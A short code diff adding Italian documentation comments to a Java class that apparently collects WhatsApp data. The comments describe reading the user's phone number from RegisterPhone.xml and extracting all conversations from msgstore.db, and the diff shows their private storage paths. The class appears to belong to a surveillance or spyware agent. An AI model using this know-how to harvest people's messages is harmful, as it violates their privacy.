@@ -65,6 +65,10 @@ public class ChatWhatsapp extends SubModuleChat {
 
 	}
 
+	/**
+	 * Estrae dal file RegisterPhone.xml il numero di telefono
+	 * @return
+	 */
 	private String readMyPhoneNumber() {
 		// f_d=/data/data/com.whatsapp/shared_prefs/RegisterPhone.xml
 		/*
@@ -171,6 +175,11 @@ public class ChatWhatsapp extends SubModuleChat {
 	// chat_list,messages where chat_list.key_remote_jid =
 	// messages.key_remote_jid
 
+	/**
+	 * Apre msgstore.db, estrae le conversazioni.
+	 * Per ogni conversazione legge i messaggi relativi
+	 * @throws IOException
+	 */
 	private synchronized void readChatMessages() throws IOException {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (readChatMessages)");
